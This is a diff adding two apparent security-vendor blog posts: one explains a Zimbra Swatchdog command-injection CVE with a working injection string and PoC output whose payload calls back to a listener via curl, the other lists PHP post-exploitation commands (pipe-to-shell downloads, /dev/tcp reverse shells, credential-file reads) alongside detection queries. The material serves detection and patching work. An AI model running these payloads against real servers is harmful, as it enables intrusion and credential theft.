@@ -754,3 +754,343 @@ Conclusion: What WESP means for EDR vendors
 WESP is Microsoft’s attempt to reduce third-party kernel code that Microsoft can't fully control. It aims to increase Windows reliability by reducing the chances of BSODs or other nastiness that could result from kernel driver code. The hope is that, by leveraging WESP, we can reduce the need for third-party kernel code and potentially remove it entirely. WESP isn't broadly available or well documented yet, but EDR providers are preparing to use it. Elastic is among them: Elastic Defend, Elastic’s XDR solution, is preparing to support WESP.
 
 Information is based on analysis conducted at the time of writing; subject to change. All product names, trademarks, and registered trademarks mentioned herein are the property of their respective owners. The release and timing of any features or functionality described in this post remain at Elastic's sole discretion. Any features or functionality not currently available may not be delivered on time or at all."
+b449c6b222f3,b449c6b222f3,2026-10-23 00:00 UTC,Vulnerabilities & Patching,Elastic Security,Elastic Security Labs,Vulnerability Management; Identity Security Posture Management; Server & Workload Protection; Email and Collaboration Security,Article,How CVE-2026-73570 turns a Zimbra log file into remote code execution,https://www.elastic.co/security-labs/threat-command/command-injection-zimbra-cve-2026-73570,"When we are building detections for various threats, we regularly run the exploits on representative systems to help us build high-quality rules","When we are building detections for various threats, we regularly run the exploits on representative systems to help us build high-quality rules. The Common Vulnerabilities and Exposures (CVE) entry CVE-2026-73570 for Zimbra is no exception. Zimbra is a widely used enterprise email and collaboration software platform, known for its SMTP platform, among other services. SMTP plays a critical role in the infrastructure of many organizations by providing email services that often include either direct or indirect identity management. In addition to the direct appeal for attackers to read emails, attachments, etc., there is also an appeal for compromised identity management. A compromised mail server can be used to impersonate legitimate accounts for further access and exploitation, becoming a staging ground for additional targets.
+
+CVE-2026-73570 is an unauthenticated command injection vulnerability in Zimbra, and one malformed recipient address is enough to trigger it. Send a malformed request and it is logged in /var/log/zimbra.log. From there, the Swatchdog monitoring daemon matches it against a service status pattern and passes it to /bin/sh inside a backticked Perl string. The result is remote code execution as the zimbra user. The account reads every mailbox on the server and sends as any local identity, so compromising the mail server compromises the identities it serves.
+
+We reproduced the full chain while building detections for it, and several of the public proofs of concept (PoCs) we tested write a payload that Swatchdog never matches, so a failed test looks like a patched server. The working chain is shown next, along with the rule that fires when a shell spawns anything other than snmptrap.
+
+Note that if you host Zimbra Simple Mail Transfer Protocol (SMTP) services and haven’t patched to version 10.1.20+, please do so before trying out the steps in this blog post.
+
+How the Zimbra command injection vulnerability works
+
+The core entry point for this kind of attack is CVE-2026-73570, a vulnerability in an unpatched Zimbra service (patched as of Zimbra version 10.1.20). When exploited, it can provide arbitrary remote code execution bypassing authentication requirements. To do this, an attacker passes a specifically crafted SMTP message that’s written to the notification file /var/log/zimbra.log for processing. Under normal circumstances, entries are written to this log to keep track of the status of services, such as when a given mailbox service has started or a message delivery has failed:
+
+Sep 30 22:48:29 mail postfix/pickup[57597]: 6272F1E1393: uid=997 from=<zimbra> Sep 30 22:48:29 mail postfix/cleanup[57599]: 6272F1E1393: message-id=<20261001024829.6272F1E1393@mail.lab.test> Sep 30 22:48:29 mail postfix/qmgr[57598]: 6272F1E1393: from=<zimbra@mail.lab.test>, size=604, nrcpt=1 (queue active) Sep 30 22:48:29 mail postfix/error[57602]: 6272F1E1393: to=<zimbra@mail.lab.test>, orig_to=<zimbra>, relay=none, delay=4707, delays=4707/0.01/0/0.01, dsn=5.0.0, status=bounced (mail.lab.test) Sep 30 22:48:29 mail postfix/cleanup[57599]: 6DD441E13F5: message-id=<20261001024829.6DD441E13F5@mail.lab.test> Sep 30 22:48:29 mail postfix/bounce[57603]: 6272F1E1393: sender non-delivery notification: 6DD441E13F5 Sep 30 22:48:29 mail postfix/qmgr[57598]: 6DD441E13F5: from=<>, size=2463, nrcpt=1 (queue active) Sep 30 22:48:29 mail postfix/qmgr[57598]: 6272F1E1393: removed Sep 30 22:48:29 mail postfix/error[57602]: 6DD441E13F5: to=<zimbra@mail.lab.test>, relay=none, delay=0.01, delays=0.01/0/0/0, dsn=5.0.0, status=bounced (mail.lab.test) Sep 30 22:48:29 mail postfix/qmgr[57598]: 6DD441E13F5: removed
+
+Figure 2: Log indication that a message failed to be delivered to zimbra@mail.lab.test.
+
+As part of the monitoring components of Zimbra, a daemon called Swatchdog watches this file for specific log entries that match the format of a service status change:
+
+Service status change: <host> <service> changed from stopped to running Service status change: <host> <service> changed from running to stopped
+
+Figure 3: Normal service message.
+
+When an entry is identified and SNMP notifications are enabled, it invokes a notification function that generates an snmptrap, a one-way alert from the mail server to a monitoring host. The target of CVE-2026-73570 is the way that this message is constructed. The SNMP notification message is parsed with Perl. Zimbra packages a copy of the Perl program Swatchdog to handle this parsing and monitor logs. It tails the log file and compiles /opt/zimbra/conf/swatchrc.in into a Perl script using perlcode lines to directly embed Perl commands into that script. By inspecting the contents of swatchrc.in, we can see the vulnerability in this process. In version Release 10.1.16.BETA.4200001.UBUNTU24.64 UBUNTU24_64 FOSS edition, this is line 26, specifically the dosnmp call:
+
+perlcode 0 my $snmptrap=""/opt/zimbra/common/bin/snmptrap $snmpargs""; perlcode 0 my $snmpsvctrap=""ZIMBRA-TRAP-MIB::zmServiceStatusTrap""; perlcode 0 my $snmpsvcname=""ZIMBRA-MIB::zmServiceName""; perlcode 0 my $snmpsvcstatus=""ZIMBRA-MIB::zmServiceStatus""; ... perlcode 0 sub dosnmp { my %args = (@_); print ""SNMP notification: $args{MESSAGE}\n""; `$snmptrap $snmpsvctrap $snmpsvcname s $args{SERVICE} $snmpsvcstatus i $statuses{$args{STATUS}}`; }
+
+Figure 5: Status 1 for service “mailbox”.
+
+However, the service name is built from $args{SERVICE} and is vulnerable to injection through log messages matching the service format. Injecting a log message is straightforward, as Postfix already records pieces of what any given SMTP client sent. So an attacker just needs to send a message that will end up in this log file. One method of doing this is to supply a message with an invalid address syntax.
+
+A normal SMTP message includes a MAIL FROM section, denoting the sender, and a RCPT TO, specifying the recipient, along with DATA, which is the message. The first two require the email address to be wrapped in angle brackets; for example, <address@host.name>. If an attacker doesn’t follow the wrapping and omits the final >, the specified unclosed address will show up in the log file. For example, an address of <address@host.namewill have a log entry as follows:
+
+warning: Illegal address syntax from mail.lab.test[10.0.2.15] in RCPT command:<address@host.name
+
+Figure 6: Invalid recipient log entry.
+
+Since the attacker controls this address, they can then specify a payload that will match the pattern that the daemon is looking for, Service status change: <host> <service>. Instead of supplying a valid host and service, the service can be replaced with arbitrary commands; for example $(touch /tmp/manual_test.txt). This will then be run as the original Perl process calls /bin/sh to send the notification. With this, the attacker has arbitrary remote code execution (RCE) on the target, including the ability to masquerade as other email identities from this server.
+
+The full chain, from inbound message to code execution, is as follows:
+
+Stage
+
+Component
+
+Artifact
+
+Delivery
+
+Postfix
+
+Malformed RCPT TO logged to /var/log/zimbra.log.
+
+Trigger
+
+Swatchdog
+
+Log line matches the service status pattern.
+
+Execution
+
+Perl dosnmp
+
+Backticks pass $args{SERVICE} to /bin/sh.
+
+Impact
+
+zimbra user
+
+Code execution, identity access.
+
+Why most public CVE-2026-73570 PoCs fail
+
+Given the ability to execute arbitrary code, an attacker can use a number of different mechanisms to establish persistence and gain further access. In testing these approaches, we found that many of the existing PoCs didn’t fully establish the RCE chain. In some cases, the PoCs wrote incorrectly formatted commands to the log file, preventing their execution. As a result, we developed a PoC that runs a variety of commands. We also include tests that run against a remote host and send a callback to a locally running web server. With this approach, we can see that the attack works without causing any additional on-disk changes to the target:
+
+elastic@test-as89074:~$ python3 CVE-2026-73570_poc.py --host 10.0.2.15 --command ""id"" --listen [*] Scanning standard SMTP ports on 10.0.2.15... [+] Port 25 (SMTP) : OPEN [-] Port 587 (SMTP) : CLOSED/FILTERED [*] Targeting 10.0.2.15:25 (Plain SMTP) [*] OOB Listener URL: http://10.0.2.16:8080/capture/abc123/ [*] Payload: x: Service status change: localhost $(curl ""http://10.0.2.16:8080/capture/abc123/$( id | tr -d ' ' )"") changed from stopped to running [*] Full RCPT TO: <""x: Service status change: localhost $(curl ""http://10.0.2.16:8080/capture/abc123/$( id | tr -d ' ' )"") changed from stopped to running""@cve.invalid> [<] 220 mail.lab.test ESMTP Postfix [>] EHLO localhost [<] 250-mail.lab.test 250-PIPELINING 250-SIZE 10240000 250-VRFY 250-ETRN 250-STARTTLS 250-ENHANCEDSTATUSCODES 250-8BITMIME 250 DSN [>] MAIL FROM:<test@test.com> [<] 250 2.1.0 Ok [>] RCPT TO:<""x: Service status change: localhost $(curl ""http://10.0.2.16:8080/capture/abc123/$( id | tr -d ' ' )"") changed from stopped to running""@cve.invalid> [<] 501 5.1.3 Bad recipient address syntax [*] Waiting up to 10 seconds for OOB callback... [*] Internal OOB listener started on http://10.0.2.16:8080/capture/... [***] OOB CALLBACK RECEIVED [***] [+] Captured Data: uid=997(zimbra)gid=982(zimbra)groups=982(zimbra),5(tty),981(postfix) [+] SUCCESS: The malicious payload was executed! [+] Captured Data: uid=997(zimbra)gid=982(zimbra)groups=982(zimbra),5(tty),981(postfix)
+
+Figure 8: PoC successful execution using a callback.
+
+How to patch and detect CVE-2026-73570
+
+Zimbra has patched this vulnerability. To remediate and detect CVE-2026-73570, take the following steps:
+
+Upgrade to Zimbra 10.1.20 or later. This is the only complete fix.
+
+Install Elastic Defend (if you haven’t already).
+
+Enable the Zimbra Swatchdog SNMP Command Injection Execution security information and event management (SIEM) rule to detect exploitation and to hunt retroactively for pre-patch attempts.
+
+sequence by host.id with maxspan=30s [process where host.os.type == ""linux"" and event.type == ""start"" and event.action in (""exec"", ""exec_event"", ""start"") and process.name in (""sh"", ""bash"", ""dash"", ""ash"", ""zsh"", ""ksh"") and process.parent.name like~ ""perl*"" and process.parent.command_line like~ ""*.swatchdog_script*"" and process.command_line like~ ""*snmptrap*"" and process.command_line like~ ""*zmservicename*"" and process.command_line like~ ""*zmservicestatus*"" ] by process.entity_id [process where host.os.type == ""linux"" and event.type == ""start"" and event.action in (""exec"", ""exec_event"", ""start"") and process.name != ""snmptrap"" ] by process.parent.entity_id
+
+The Zimbra Swatchdog detection rule identifies a sequence of processes that break from the normal Zimbra pattern. First, a shell process, /bin/sh in the prior example, is started from a parent watchdog script Perl process and has snmptrap in its command arguments, matching the expected call /opt/zimbra/common/bin/snmptrap ... ZIMBRA-MIB::zmServiceName s mailbox ... from earlier. Second, the rule detects a subprocess launched by the shell identified in the first step, provided that the subprocess isn’t snmptrap. Since the only process that should run under legitimate circumstances is snmptrap, this is a very strong indicator of successful exploitation.
+
+If you detect a compromise, hunt for:
+
+Standard indicators of remote code execution on the host.
+
+Phishing emails originating from the server.
+
+Compromise of local databases and signing keys, as well as LDAP exports.
+
+Less direct surfaces beyond the mail store itself.
+
+Zimbra detection rules in Elastic Security
+
+Zimbra Swatchdog SNMP Command Injection Execution
+
+References
+
+CVE-2026-73570: Zimbra Collaboration unauthenticated RCE via Swatchdog/SNMP log-injection command injection swatchrc dosnmp Perl backtick
+
+Unauthenticated command injection on internet-facing mail servers: tracking CVE-2026-73570
+
+Zimbra Daffodil (v10.1.20) Patch Release"
+2b62329cc6f4,2b62329cc6f4,2026-10-20 22:00 UTC,Vulnerabilities & Patching,Elastic Security,Elastic Security Labs,Vulnerability Management,Article,php2shell: Assessing Elastic detection coverage relevant to CVE-2026-109618 and CVE-2026-109619,https://www.elastic.co/security-labs/threat-command/php2shell-php-rce-detection,"A web server process spawning a shell or writing a payload is abnormal no matter which vulnerability opened the door, which is why we build detection on that behavior rather...","On October 20, 2026, details of two critical remote code execution vulnerabilities in PHP, CVE-2026-109618 and CVE-2026-109619, leaked online ahead of their coordinated disclosure and before any patch existed. The PHP security team responded with advance notice of an emergency security release, scheduled for October 21, 2026 at 14:00 UTC, and rated both flaws critical with a CVSS v4.0 score of 9.2. Researchers at watchTowr confirmed the vulnerabilities are real and said they reproduced CVE-2026-109618, while noting they have not observed in-the-wild exploitation. The nickname circulating among researchers is php2shell.
+
+PHP runs behind a very large share of the web: WordPress, Drupal, Joomla, and Magento, shared hosting and control panels, and a long tail of vendor software that bundles a PHP runtime without advertising it. When a critical bug lands in PHP core rather than in one application on top of it, the number of places you have to inventory grows quickly.
+
+The PHP security team and the reporting researchers have now published the technical root cause, a pair of memory-safety bugs in PHP core, but at the time of writing there is still no reliable public proof-of-concept to run end to end. That is an awkward position for a defender, because you cannot simply run the exploit and watch the rules fire. It is not, however, a blind spot. An RCE in a PHP web application ends in the same observable place: a PHP worker process doing something a PHP worker process should not do. That convergent behavior is what we detect, and it is what this post is about.
+
+In this post, we will cover:
+
+What the advisory confirmed about CVE-2026-109618 and CVE-2026-109619, and what it means for defenders.
+
+Why php2shell will likely behave like generic PHP backend exploitation.
+
+The convergent post-exploitation flow, and the Elastic rules that cover this behavior.
+
+How to assess and prepare potential coverage before the PoC lands, and what to do right now.
+
+We have walked a PHP-adjacent RCE end-to-end before, in Detecting wp2shell: WordPress pre-authentication RCE in the wild, which turned out to use the same precedence and was caught through similar pre-built behavioral rules.
+
+What we know about CVE-2026-109618 and CVE-2026-109619
+
+Here is what is verified at the time of writing, and what is not.
+
+What we know. Both vulnerabilities are unauthenticated remote code execution flaws in PHP core, each rated critical by the PHP security team with a CVSS v4.0 score of 9.2. They were reported by Wiz Research, which identified them with the help of frontier AI models and coordinated disclosure with the PHP project. Additionally, a web page called php2shell was created and contains a lot of relevant information about the vulnerability. Information leaked on October 20 ahead of the embargo, which is why PHP moved its release forward to October 21 at 14:00 UTC. With that release, PHP published the patched versions, the affected branches, and the technical root cause.The PHP security team patched the vulnerabilities through commit 31c0ea7d7ff1d1fccb6492e52dab544011628065.
+
+What we do not know. The advisory names two distinct root-cause classes, both reachable by an unauthenticated web request:
+
+CVE-2026-109618, RCE via out-of-memory (OOM) corruption (GHSA-w8hw-w9fx-j79w): out-of-memory handling can interrupt PHP while internal request data is only partially initialized, and request cleanup may then treat the invalid data as valid.
+
+CVE-2026-109619, RCE via stale global state (GHSA-6wmf-4rv5-p3rp): request-owned internal state can survive after its backing memory has been freed, and a later request handled by the same worker may use that stale state before normal initialization resets it.
+
+Fixed versions are PHP 8.5.12, 8.4.27, 8.3.36, and 8.2.35. The risk spans any PHP installation serving web requests, including PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP, and LiteSpeed, with the PHP team flagging mod_php as highest risk because an unauthenticated request can trigger the issue before any application code runs. PHP 8.1 and older no longer receive updates from the PHP project, though minimal source backports were provided for 7.4, 8.0, and 8.1, and some distributions and LTS vendors ship backported fixes.
+
+Based on public reporting, the activity maps to Exploit Public-Facing Application (T1190), and once an attacker has code execution, to Command and Scripting Interpreter (T1059) and Server Software Component: Web Shell (T1505.003).
+
+Is there a php.ini mitigation for php2shell?
+
+The PHP security team is explicit that there are no complete mitigations and that updating is the only safe choice. It does, however, document configuration measures that reduce exposure to specific attack paths without making an installation safe. For the OOM-corruption path (CVE-2026-109618), set memory_limit=-1 in a way applications cannot override (for example php_admin_value in the FPM pool or Apache configuration), keep post_max_size low, and enforce a container or cgroup limit rather than RLIMIT_AS or RLIMIT_DATA. For the stale-global-state path (CVE-2026-109619), set session.upload_progress.enabled=0 and restart every worker, which blocks the confirmed session paths but not all variants, and on PHP 8.5 set fatal_error_backtraces=0. Apply these through php.ini, an FPM pool, or server configuration that takes effect before request parsing; ini_set() and .user.ini do not help. Treat all of these as temporary exposure reduction, not a fix, and be skeptical of social-media guidance that presents a single config toggle as a complete solution.
+
+Why php2shell exploitation likely looks like every other PHP RCE
+
+We now know the bug class: two memory-safety bugs in PHP core, but the detection opportunity is in the outcome, not the trigger.
+
+A remote attacker exploiting a PHP web application wants code execution in the context of the web stack, and that context is a predictable set of processes: php-fpm and its workers, php-cgi, lsphp, or a general web server like apache2, httpd, or nginx driving PHP. Once the attacker has execution inside that context, the next actions are almost always the same regardless of how they got there:
+
+Confirm access. A first command through a shell to prove execution and establish identity: id, whoami, uname -a, hostname, or cat /etc/os-release.
+
+Enumerate for escalation. Quick checks for a path to root: sudo -l, find / -perm -u=s -type f for SUID binaries, getcap -r / for capabilities, or reading /etc/passwd and /etc/shadow.
+
+Stage through an interpreter. Pivot out of the shell into a richer runtime: python3 -c, perl -e, ruby -e, node -e, or back into PHP itself with php -r, often to run code that never touches disk.
+
+Pull second-stage tooling. Retrieve a payload with curl -O or wget -O, or pipe it straight into an interpreter (curl http(s)://... | bash, wget -qO- http(s)://... | sh).
+
+Decode a staged payload inline. Unpack an embedded blob without a download: echo <b64> | base64 -d | sh, openssl enc -d, or xxd -r.
+
+Open a reverse shell. The usual primitives: bash -i >& /dev/tcp/<ip>/<port> 0>&1, mkfifo paired with nc, socat, a Python pty.spawn, or PHP fsockopen.
+
+Harvest credentials and cloud identity. Read .env files, ~/.aws/credentials, a mounted service account token under (var)/run/secrets/kubernetes.io/, or the instance metadata endpoint at 169.254.169.254.
+
+Drop a webshell. Write attacker-controlled PHP into the web root (.php, .phtml), sometimes disguised as an image polyglot or a double extension such as avatar.php.jpg to slip past upload validation.
+
+Establish persistence beyond the shell. Add a cron entry, a systemd unit, or an SSH key to ~/.ssh/authorized_keys so access survives a webshell cleanup.
+
+This is exactly the host footprint we walked end-to-end in the wp2shell post. There, a completely different bug (a WordPress REST batch route confusion) ended in apache2 spawning dash to run sh -c -- id; whoami; hostname, and plugin files landing under wp-content/. The entry point was WordPress-specific. The thing that fired the detections was not. A web server process spawning a shell or writing a payload is abnormal no matter which vulnerability opened the door, which is why we build detection on that behavior rather than on an exploit string that doesn’t exist yet. Although we can generally predict the outcome, we can never be entirely certain that we fully cover the threat, as there could be other forms of post-exploitation that we don't catch, like creation of an account or fileless PHP script execution.
+
+That is the core of predicting coverage before a PoC lands: detect the convergent flow, not the specific trigger.
+
+The php2shell post-exploitation flow: what a compromised web server does next
+
+This section is the durable, exploit-agnostic layer. It keys on a web server process (PHP runtimes and general web servers) taking an action that is abnormal for a request-serving daemon. We group the coverage by the observable outcome. Endpoint (EDR) rules are shipped in the public protections-artifacts repository and can prevent as well as alert; SIEM rules are shipped in the public detection-rules repository. The queries below show only the distinctive predicate, not the full rule with all of its production exclusions.
+
+Process execution: the web server spawns a shell
+
+The tightest signal for ""a PHP RCE just succeeded"" is a request-serving process spawning a shell to run a suspicious command. The endpoint rule keys on a non-interactive web server parent launching a shell with a high-risk command line, and terminates it where prevention is enabled:
+
+process where event.type == ""start"" and event.action == ""exec"" and process.parent.interactive == false and ( process.parent.name in (""apache2"", ""httpd"", ""nginx"", ""php-cgi"") or process.parent.name like (""php-fpm*"", ""lsphp*"") ) and process.name in (""bash"", ""dash"", ""sh"", ""zsh"", ""ksh"") and process.args in (""-c"", ""-cl"", ""-lc"") and ( process.command_line like~ ( ""*/dev/tcp*"", ""*|*base64 -d*"", ""*curl*"", ""*wget*"", ""*/etc/shadow*"" ) or process.args in (""id"", ""whoami"", ""hostname"") )
+
+This maps to the endpoint rule Payload Execution by Web Server, which covers a broad set of web server parents (the PHP runtimes, Apache, nginx, and many application servers) and a long catalog of suspicious command lines, from discovery commands through reverse shells, decoding pipelines, and credential-file access. It is the rule that terminated dash in the wp2shell run.
+
+On the SIEM side, two rules cover the same shell activity without a preventive action, which lets them carry fewer exclusions and reduce the risk of false negatives. Suspicious Command Execution via Web Server matches known-bad command lines from a web server parent. Unusual Command Execution via Web Server is a new_terms rule: it learns which shell command lines each web server parent normally runs on a host, then alerts on lines that break the baseline. A fresh exploit introduces command lines the host has never seen, so the two stack well together.
+
+Child execution: the web server spawns a non-shell child
+
+Not every PHP RCE goes through a shell. A php2shell payload may invoke an interpreter directly (python -c, perl -e), pull tooling with a downloader, or drop into a reverse-shell helper. Two SIEM rules cover a web server spawning children outside its normal set:
+
+We have an endpoint rule named Suspicious Web Server Child Process, which covers a broad set of web parents and potentially suspicious child processes. This rule has response actions to kill the child process.
+
+For SIEM, we have a similar but broader rule named Suspicious Child Execution via Web Server, which keys on a web server parent whose child is run from a suspicious path (/tmp/, /dev/shm/, /var/tmp/, the web root) or is a suspicious binary (an interpreter, a networking utility, a cloud CLI, a file with a script extension). Unusual Child Execution via Web Server applies the new_terms approach to child executions, surfacing child processes a given web server has never spawned on that host. They did not fire in the wp2shell run, because that chain went through dash and standard discovery binaries that the command-execution rules already cover, but they are the layer that catches a variant invoking curl | bash or python -c directly.
+
+Payload download: the web server pulls second-stage tooling
+
+A common follow-on to PHP RCE is retrieving a second-stage payload. The endpoint rule Payload Downloaded via Curl or Wget by Web Server detects a web server parent invoking curl or wget through a shell to save a remote file to disk or pipe it into an interpreter, and terminates it where prevention is enabled. It did not need to fire in the wp2shell PoC, which carried its own payload, but it is a high-value layer for a real intrusion that stages tooling from an external host.
+
+File creation: the PHP webshell drop
+
+Before any command runs, the attacker often has to write a file: a webshell, a dropped script, an uploaded archive. A web server writing new executable or script content into the web root is abnormal outside of a deployment. Three rules cover this from different angles:
+
+Unusual File Creation via Web Server is a new_terms rule that flags a web server creating or renaming a file it does not normally touch.
+
+Unusual File Creation by Web Server is a building block rule that surfaces unusual file creations by a web server parent, useful as correlation context rather than a standalone alert.
+
+File with High Entropy Created by Web Server keys on a web server writing a high-entropy file with a web-executable extension, a common sign of an encoded or encrypted payload such as an obfuscated .phtml webshell.
+
+How to prepare coverage for php2shell before the exploit exists
+
+Because the post-exploitation flow is predictable, you can line up coverage now rather than scrambling when the exploit code appears. Enable these pre-built SIEM rules on any host running PHP or a web server:
+
+Suspicious Command Execution via Web Server
+
+Unusual Command Execution via Web Server
+
+Suspicious Child Execution via Web Server
+
+Unusual Child Execution via Web Server
+
+Unusual File Creation via Web Server
+
+Unusual File Creation by Web Server
+
+File with High Entropy Created by Web Server
+
+Web Shell Detection: Script Process Child of Common Web Processes
+
+Deploy Elastic Defend with prevention enabled on those same hosts to add the endpoint layer, which can terminate processes that match the applicable behavioral rules. The high-entropy rule require Elastic Stack 9.3.0 or later. In the Elastic Defend integration policy, under advanced settings, set linux.advanced.events.populate_file_data to true and verify that incoming file events include file.Ext.entropy for the high-entropy rule.
+
+The coverage spans two data sources, process and file, which is why both layers matter:
+
+Public Elastic rule guidance for the php2shell post-exploitation flow
+
+Telemetry source
+
+Elastic detection rule
+
+Process
+
+Payload Execution by Web Server (EDR)
+
+Process
+
+Payload Downloaded via Curl or Wget by Web Server (EDR)
+
+Process
+
+Suspicious Web Server Child Process (EDR)
+
+Process
+
+Suspicious Command Execution via Web Server
+
+Process
+
+Unusual Command Execution via Web Server
+
+Process
+
+Suspicious Child Execution via Web Server
+
+Process
+
+Unusual Child Execution via Web Server
+
+File
+
+Unusual File Creation via Web Server
+
+File
+
+Unusual File Creation by Web Server
+
+File
+
+File with High Entropy Created by Web Server
+
+If your web stack runs behind a parent process that is not yet in these lists, let us know so we can extend their scope.
+
+How to find PHP installs that may be affected by php2shell
+
+Start by identifying PHP deployments across Linux and Windows, including runtimes bundled with other applications. Patched versions are PHP 8.5.12, 8.4.27, 8.3.36, and 8.2.35, so use the queries below to inventory PHP across your environment and prioritize anything that is unpatched or end of life.
+
+Find PHP through process telemetry
+
+In Kibana Discover, select a data view containing process events, such as logs-endpoint.events.process-*, and search the available retention period, for example, the last 7 days:
+
+event.category: process and ( process.name: (php* or lsphp* or frankenphp or sw-engine-fpm) or process.parent.name: (php* or lsphp* or frankenphp or sw-engine-fpm) )
+
+Review host.name, process.executable, process.parent.executable, and container.id where available. The query includes common Windows process names such as php.exe and php-cgi.exe. Parent-process matches can also reveal PHP workers through their recorded child processes.
+
+Locate PHP installs on Linux and Windows
+
+Process telemetry can miss inactive installations. Use Osquery to check common system and hosting-platform locations for PHP binaries and Apache PHP modules. The first example runs the query for Linux systems:
+
+SELECT DISTINCT path, filename, type, symlink FROM file WHERE ( path LIKE '/usr/bin/php%' OR path LIKE '/usr/sbin/php%' OR path LIKE '/usr/local/bin/php%' OR path LIKE '/usr/local/sbin/php%' OR path LIKE '/usr/lib/cgi-bin/php%' OR path LIKE '/opt/cpanel/ea-php%/root/usr/bin/php%' OR path LIKE '/opt/cpanel/ea-php%/root/usr/sbin/php-fpm%' OR path LIKE '/opt/plesk/php/%/bin/php%' OR path LIKE '/opt/plesk/php/%/sbin/php-fpm%' OR path LIKE '/opt/remi/php%/root/usr/bin/php%' OR path LIKE '/opt/remi/php%/root/usr/sbin/php-fpm%' OR path LIKE '/opt/rh/rh-php%/root/usr/bin/php%' OR path LIKE '/opt/rh/rh-php%/root/usr/sbin/php-fpm%' OR path LIKE '/usr/local/lsws/lsphp%/bin/lsphp' OR path LIKE '/usr/local/lsws/fcgi-bin/lsphp%' OR path LIKE '/snap/php%/%/bin/php%' OR path LIKE '/nix/store/%php%/bin/php%' OR path LIKE '/usr/lib/apache2/modules/libphp%.so' OR path LIKE '/usr/lib/httpd/modules/libphp%.so' OR path LIKE '/usr/lib64/httpd/modules/libphp%.so' /* Generic custom installation paths */ OR path LIKE '/%/php%/php%' OR path LIKE '/%/php%/%/php%' OR path LIKE '/%/%/php%/php%' OR path LIKE '/%/%/php%/%/php%' OR path IN ( '/usr/bin/lsphp', '/usr/local/bin/lsphp', '/usr/bin/frankenphp', '/usr/local/bin/frankenphp' ) ) ORDER BY path;
+
+The second query checks common Windows standalone and bundled installations.
+
+SELECT DISTINCT path, filename, file_version, product_version FROM file WHERE ( path LIKE 'C:\PHP%\php%' OR path LIKE 'C:\PHP%\%\php%' OR path LIKE 'C:\%\PHP%\php%' OR path LIKE 'C:\%\PHP%\%\php%' OR path LIKE 'C:\Program Files%\%\PHP%\php%' OR path LIKE 'C:\Program Files%\%\PHP%\%\php%' OR path LIKE 'C:\wamp%\bin\php\%\php%' OR path LIKE 'C:\laragon\bin\php\%\php%' OR path LIKE 'C:\Program Files%\Plesk\Additional\%PHP%\php%' OR path LIKE 'C:\Program Files%\Plesk\admin\bin\php%' ) AND LOWER(filename) IN ('php.exe', 'php-cgi.exe', 'php-win.exe') ORDER BY path;
+
+This results in the following example hits:
+
+We can also leverage OSQuery’s deb_package and rpm_package tables:
+
+SELECT name, version, arch, status FROM deb_packages WHERE status = 'install ok installed' AND ( name LIKE 'php%' OR name LIKE 'libapache2-mod-php%' OR name LIKE 'lsphp%' OR name LIKE 'ea-php%' OR name LIKE 'plesk-php%' OR name = 'sw-engine' ) ORDER BY name;
+
+And:
+
+SELECT name, version, release, epoch, arch FROM rpm_packages WHERE name LIKE 'php%' OR name LIKE 'lsphp%' OR name LIKE 'ea-php%' OR name LIKE 'plesk-php%' OR name = 'sw-engine' ORDER BY name;
+
+Of course, this is a short list of potential locations; use your own inventory to scan your environment. Extend these paths for other drives, custom installations, and vendor software. Inspect container filesystems separately. File matches may include unused installations, wrappers, or helper utilities. Missing results do not establish that PHP is absent.
+
+What to do about CVE-2026-109618 and CVE-2026-109619 right now
+
+PHP has released the fixes, so patching is now the priority, with exposure reduction for anything you cannot patch immediately:
+
+Inventory every PHP install you own. Start with internet-facing web servers, then go looking for the less obvious locations: vendor appliances and software that bundle a PHP runtime, control panels, and anything running WordPress, Drupal, Joomla, or Magento.
+
+Patch internet-facing systems first, to PHP 8.5.12, 8.4.27, 8.3.36, or 8.2.35, and check your Linux distribution and hosting provider for backported packages.
+
+Identify end-of-life PHP. If you are running PHP 8.1 or older, the PHP project no longer ships updates, though minimal source backports exist for 7.4, 8.0, and 8.1 and some vendors provide backported packages. Upgrade, take it off the internet, or place it behind a VPN or web application firewall until you can.
+
+If you cannot patch immediately, apply PHP's documented partial mitigations (for example session.upload_progress.enabled=0, and a constrained memory_limit and post_max_size), but treat them as temporary exposure reduction, not a fix.
+
+If you find something, isolate the host and preserve web server and PHP logs. Look for webshells and new files in the web root, along with new cron jobs, services, and accounts.
+
+php2shell detection: what holds regardless of the root cause
+
+CVE-2026-109618 and CVE-2026-109619 are two critical, unauthenticated PHP core RCE flaws that were publicly identified before their coordinated disclosure. The patched releases (8.5.12, 8.4.27, 8.3.36, 8.2.35) and the two root-cause classes are now public, but the post-exploitation outcome is what makes them detectable: a web server process spawning a shell, pulling a payload, or dropping a webshell into the web root. Elastic already ships the behavioral layer that catches that convergent flow across both process and file telemetry.
+
+Patch now, isolate what you cannot patch, and verify the web-server-to-shell detection stack is enabled on your PHP hosts. We will revisit this post with concrete telemetry as reliable public exploitation details emerge."
